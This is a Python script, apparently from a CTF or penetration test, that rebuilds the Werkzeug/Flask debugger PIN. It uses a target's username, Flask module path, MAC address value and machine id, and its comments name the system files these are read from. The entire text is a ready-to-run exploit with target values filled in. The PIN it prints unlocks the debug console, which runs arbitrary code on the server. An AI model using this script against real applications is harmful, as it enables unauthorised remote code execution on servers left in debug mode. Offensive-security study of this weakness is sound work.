import hashlib
from itertools import chain
probably_public_bits = [
	'werkza',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None), real_path, check pyt vers
]

private_bits = [
	'345052393296',# str(uuid.getnode()),  /sys/class/net/???/address, mac, print(0xmac)
	'258f132cd7e647caaf5510e3aca997c1'# get_machine_id(), /etc/machine-id, /proc/sys/kernel/random/boot_id, /proc/self/cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num

print(rv)
